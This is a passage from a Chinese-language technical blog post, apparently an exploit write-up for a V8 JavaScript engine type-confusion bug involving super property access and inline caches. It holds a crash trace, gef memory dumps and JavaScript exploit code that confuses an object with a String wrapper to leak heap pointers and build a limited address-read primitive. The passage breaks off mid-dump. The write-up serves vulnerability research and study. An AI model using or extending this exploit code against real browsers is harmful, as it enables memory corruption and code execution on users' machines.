<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># Fatal error in ../../src/compiler/code-assembler.cc, line <span class="number">1726</span></span><br><span class="line"># Type cast failed in Parameter <span class="number">0</span> at ../../src/builtins/builtins-handler-gen.cc:<span class="number">315</span></span><br><span class="line">  Expected JSFunction but found <span class="number">0x22290816f4f9</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: <span class="number">0x22290831ba29</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x22290816f2e9</span> &lt;C map = <span class="number">0x22290831b939</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x22290804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x22290804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own <span class="built_in">properties</span> (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x2229082d286d</span>: [String] in OldSpace: #x0: <span class="number">1</span> (<span class="type">const</span> data field <span class="number">0</span>), location: in-object</span><br><span class="line">    <span class="number">0x2229082d287d</span>: [String] in OldSpace: #x1: <span class="number">1</span> (<span class="type">const</span> data field <span class="number">1</span>), location: in-object</span><br><span class="line">    <span class="number">0x2229082d288d</span>: [String] in OldSpace: #x2: <span class="number">1</span> (<span class="type">const</span> data field <span class="number">2</span>), location: in-object</span><br><span class="line">    <span class="number">0x2229082d289d</span>: [String] in OldSpace: #x3: <span class="number">1</span> (<span class="type">const</span> data field <span class="number">3</span>), location: in-object</span><br><span class="line">    <span class="number">0x2229082d28ad</span>: [String] in OldSpace: #x4: <span class="number">555819297</span> (<span class="type">const</span> data field <span class="number">4</span>), location: in-object</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line">#FailureMessage Object: <span class="number">0x7ffe04dc1010</span></span><br><span class="line">==== C stack trace ===============================</span><br><span class="line"></span><br><span class="line">    /home/anemone/Browser/Chrome/v8/v8/out.gn/x64.debug/libv8_libbase.<span class="built_in">so</span>(v8::base::debug::StackTrace::<span class="built_in">StackTrace</span>()+<span class="number">0x1e</span>) [<span class="number">0x7fd329eaff5e</span>]</span><br><span class="line">    /home/anemone/Browser/Chrome/v8/v8/out.gn/x64.debug/libv8_libplatform.<span class="built_in">so</span>(+<span class="number">0x55b4d</span>) [<span class="number">0x7fd329e2eb4d</span>]</span><br><span class="line">    /home/anemone/Browser/Chrome/v8/v8/out.gn/x64.debug/libv8_libbase.<span class="built_in">so</span>(<span class="built_in">V8_Fatal</span>(<span class="type">char</span> <span class="type">const</span>*, <span class="type">int</span>, <span class="type">char</span> <span class="type">const</span>*, ...)+<span class="number">0x231</span>) [<span class="number">0x7fd329e94651</span>]</span><br><span class="line">    /home/anemone/Browser/Chrome/v8/v8/out.gn/x64.debug/libv8.<span class="built_in">so</span>(v8::internal::<span class="built_in">CheckObjectType</span>(<span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)+<span class="number">0x5bb9</span>) [<span class="number">0x7fd32d676409</span>]</span><br><span class="line">    /home/anemone/Browser/Chrome/v8/v8/out.gn/x64.debug/libv8.<span class="built_in">so</span>(+<span class="number">0x1a3feca</span>) [<span class="number">0x7fd32b8faeca</span>]</span><br><span class="line">Received signal <span class="number">4</span> ILL_ILLOPN <span class="number">7f</span>d329ead151</span><br><span class="line">[<span class="number">1</span>]    <span class="number">20453</span> illegal hardware <span class="built_in">instruction</span> (core dumped)  ./d8 --allow-natives-syntax --log-maps --trace-ic --log-code exp.js</span><br></pre></td></tr></table></figure>

<p>因为：</p>
<p><img src="https://s2.loli.net/2022/05/04/AuYK2qa3UCnsbQo.png" alt="Untitled 5.png"></p>
<p>也就是：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O.prototype.__proto__ == Object.prototype</span><br></pre></td></tr></table></figure>

<p>所以当调用 <code>c.m()</code> 的时候，所找到的便是 <code>f.prototype</code> ，而在生成了 <code>IC</code> 之后所使用的便不是 <code>f</code> 而是 <code>c</code> ，进而是一个 <code>JS_OBJECT</code> 和 <code>JSFunction</code> 的混淆，也就是方法 <code>f</code> 和 <code>c</code> 的混淆</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>那么我们有一个类型混淆该怎么进行利用呢？让我们来介绍一下 <code>JSPrimitiveWrapper</code> ，当我们使用如下方法声明一个字符串的时候，便就是 <code>JSPrimitiveWrapper</code> ：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x3cf081492c5</span></span><br><span class="line"><span class="number">0x3cf081492c5</span>: [<span class="title class_">JSPrimitiveWrapper</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x03cf08302bb9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">FAST_STRING_WRAPPER_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x03cf082c7565</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3cf083067e1</span> value = <span class="number">0x03cf080424fd</span> &lt;<span class="title class_">String</span>[<span class="number">0</span>]: #&gt;&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x03cf0804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">FAST_STRING_WRAPPER_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">value</span>: <span class="number">0x03cf082d25a5</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: #A&gt;</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x03cf0804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x3cf080446d1</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">length</span>: <span class="number">0x03cf082423c1</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>其字符串长度在 <code>value</code> 所指向的地方（也就是 <code>c.length</code> ）：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/30wx <span class="number">0x3cf081492c5</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x3cf081492c4</span>:	<span class="number">0x08302bb9</span>	<span class="number">0x0804222d</span>	<span class="number">0x0804222d</span>	<span class="number">0x082d25a5</span></span><br><span class="line"><span class="number">0x3cf081492d4</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x3cf081492e4</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x3cf081492f4</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x3cf08149304</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x3cf08149314</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x3cf08149324</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x3cf08149334</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x082d25a5</span></span><br><span class="line"><span class="number">0x3cf082d25a5</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span>: #A</span><br><span class="line"></span><br><span class="line">gef➤  x/30wx <span class="number">0x3cf082d25a5</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x3cf082d25a4</span>:	<span class="number">0x08042251</span>	<span class="number">0xd6da2596</span>	<span class="number">0x00000001</span>	<span class="number">0xbeadbe41</span> <span class="comment">// 0x00000001 为长度，0xbeadbe41 中的第一个字节为值</span></span><br><span class="line"><span class="number">0x3cf082d25b4</span>:	<span class="number">0x08042251</span>	<span class="number">0x4862524a</span>	<span class="number">0x0000000b</span>	<span class="number">0x74737953</span></span><br><span class="line"><span class="number">0x3cf082d25c4</span>:	<span class="number">0x72426d65</span>	<span class="number">0xbe6b6165</span>	<span class="number">0x08042191</span>	<span class="number">0x0000000c</span></span><br><span class="line"><span class="number">0x3cf082d25d4</span>:	<span class="number">0x082d25ef</span>	<span class="number">0x082d26ab</span>	<span class="number">0x082d26e3</span>	<span class="number">0x082d271b</span></span><br><span class="line"><span class="number">0x3cf082d25e4</span>:	<span class="number">0x082d2753</span>	<span class="number">0x082d278b</span>	<span class="number">0x080425f9</span>	<span class="number">0x082d28cd</span></span><br><span class="line"><span class="number">0x3cf082d25f4</span>:	<span class="number">0x082d2615</span>	<span class="number">0x082d2a11</span>	<span class="number">0x082d247d</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x3cf082d2604</span>:	<span class="number">0x00020000</span>	<span class="number">0x08001000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000047</span></span><br><span class="line"><span class="number">0x3cf082d2614</span>:	<span class="number">0x080425d1</span>	<span class="number">0x0000001a</span></span><br></pre></td></tr></table></figure>

<p>如果我们像这样声明一个对象 <code>o</code> ：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">O</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Object</span>&#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x0</span> = <span class="variable language_">this</span>;</span><br><span class="line">		<span class="variable language_">this</span>[<span class="number">0</span>] = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title function_">O</span>();</span><br></pre></td></tr></table></figure>

<p>那么在 <code>map、properties</code> 和 <code>elements</code> 后面的便是指向自己的指针，也就是 <code>this.x0 = this</code> 的作用</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job <span class="number">0x12670814910d</span></span><br><span class="line"><span class="number">0x12670814910d</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x126708307231</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x126708148ed1</span> &lt;O map = <span class="number">0x126708307209</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x1267081491d1</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">17</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x12670804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x1267082d2c75</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span>: #<span class="attr">x0</span>: <span class="number">0x12670814910d</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x126708307231</span>&gt; (<span class="keyword">const</span> data field <span class="number">0</span>), <span class="attr">location</span>: <span class="keyword">in</span>-object</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x1267081491d1</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">17</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">858993459</span></span><br><span class="line">        <span class="number">1</span>-<span class="number">16</span>: <span class="number">0x12670804242d</span> &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">gef➤  x/30wx <span class="number">0x12670814910d</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x12670814910c</span>:	<span class="number">0x08307231</span>	<span class="number">0x0804222d</span>	<span class="number">0x081491d1</span>	<span class="number">0x0814910d</span> <span class="comment">// 指向自己</span></span><br><span class="line"><span class="number">0x12670814911c</span>:	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span></span><br><span class="line"><span class="number">0x12670814912c</span>:	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span></span><br><span class="line"><span class="number">0x12670814913c</span>:	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span>	<span class="number">0x080422c5</span></span><br><span class="line"><span class="number">0x12670814914c</span>:	<span class="number">0x080422c5</span>	<span class="number">0x08042205</span>	<span class="number">0x00000004</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x12670814915c</span>:	<span class="number">0x0000000e</span>	<span class="number">0x08045a01</span>	<span class="number">0x00020002</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x12670814916c</span>:	<span class="number">0x080421f9</span>	<span class="number">0x08044115</span>	<span class="number">0x00000228</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x12670814917c</span>:	<span class="number">0x082d255d</span>	<span class="number">0x00100628</span></span><br></pre></td></tr></table></figure>

<p>当我们让类型 <code>O</code> 和 <code>JSPrimitiveWrapper</code> 混淆了之后，我们便可以泄漏出 <code>elements</code> 数组指针的值，如下所示：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32</span> = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = f;</span><br><span class="line">	<span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">O</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Object</span>&#123;</span><br><span class="line">	<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="variable language_">super</span>();</span><br><span class="line">		<span class="variable language_">this</span>.<span class="property">x0</span> = <span class="variable language_">this</span>;</span><br><span class="line">		<span class="variable language_">this</span>[<span class="number">0</span>] = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title function_">O</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">const</span> proto = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">	O.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">	proto.<span class="property">length</span>;</span><br><span class="line">	<span class="keyword">var</span> l = o.<span class="title function_">m</span>();</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">	<span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">f</span>()));</span><br><span class="line">&#125;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>同样的，如果我们使用 <code>Array</code> ，则会发现它的 <code>length</code> 我们可以随便设置，且刚好就是 <code>JSPrimitiveWrapper</code> 的 <code>value</code> 指针处：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="property">length</span> = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x42808149245</span></span><br><span class="line"><span class="number">0x42808149245</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x042808307259</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">DICTIONARY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x0428082cb899</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x042808149265</span> &lt;<span class="title class_">NumberDictionary</span>[<span class="number">16</span>]&gt; [<span class="variable constant_">DICTIONARY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">858993459</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x04280804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x428080446d1</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">length</span>: <span class="number">0x04280824215d</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x042808149265</span> &lt;<span class="title class_">NumberDictionary</span>[<span class="number">16</span>]&gt; &#123;</span><br><span class="line">   - <span class="attr">max_number_key</span>: <span class="number">1</span></span><br><span class="line">   <span class="number">0</span>: <span class="number">1</span> (data, <span class="attr">dict_index</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   <span class="number">1</span>: <span class="number">2</span> (data, <span class="attr">dict_index</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">gef➤  x/30wx <span class="number">0x42808149245</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x42808149244</span>:	<span class="number">0x08307259</span>	<span class="number">0x0804222d</span>	<span class="number">0x08149265</span>	<span class="number">0x66666666</span> <span class="comment">// length</span></span><br><span class="line"><span class="number">0x42808149254</span>:	<span class="number">0x08042205</span>	<span class="number">0x00000004</span>	<span class="number">0x00000002</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x42808149264</span>:	<span class="number">0x08042b89</span>	<span class="number">0x00000020</span>	<span class="number">0x00000004</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x42808149274</span>:	<span class="number">0x00000008</span>	<span class="number">0x00000004</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span></span><br><span class="line"><span class="number">0x42808149284</span>:	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span></span><br><span class="line"><span class="number">0x42808149294</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000002</span>	<span class="number">0x00000000</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x428081492a4</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"><span class="number">0x428081492b4</span>:	<span class="number">0xbeadbeef</span>	<span class="number">0xbeadbeef</span></span><br></pre></td></tr></table></figure>

<p>那么我们便可以获得有限范围内地址读的能力，为什么是有限范围呢？因为当 <code>length</code> 大于 <code>SMI</code> 的范围的时候，便会使用一个 <code>HeapNumber</code> 来存储长度，然后 <code>length</code> 处便变为了指向该 <code>HeapNumber</code> 的指针：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">a.<span class="property">length</span> = <span class="number">0xe6666666</span> / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x279d08149245</span></span><br><span class="line"><span class="number">0x279d08149245</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x279d08307259</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">DICTIONARY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x279d082cb899</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x279d08149265</span> &lt;<span class="title class_">NumberDictionary</span>[<span class="number">16</span>]&gt; [<span class="variable constant_">DICTIONARY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">0x279d081492ad</span> &lt;<span class="title class_">HeapNumber</span> <span class="number">1932735283.0</span>&gt;</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x279d0804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x279d080446d1</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">length</span>: <span class="number">0x279d0824215d</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x279d08149265</span> &lt;<span class="title class_">NumberDictionary</span>[<span class="number">16</span>]&gt; &#123;</span><br><span class="line">   - <span class="attr">max_number_key</span>: <span class="number">1</span></span><br><span class="line">   <span class="number">0</span>: <span class="number">1</span> (data, <span class="attr">dict_index</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line">   <span class="number">1</span>: <span class="number">2</span> (data, <span class="attr">dict_index</span>: <span class="number">0</span>, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>])</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">gef➤  x/30wx <span class="number">0x279d08149245</span>-<span 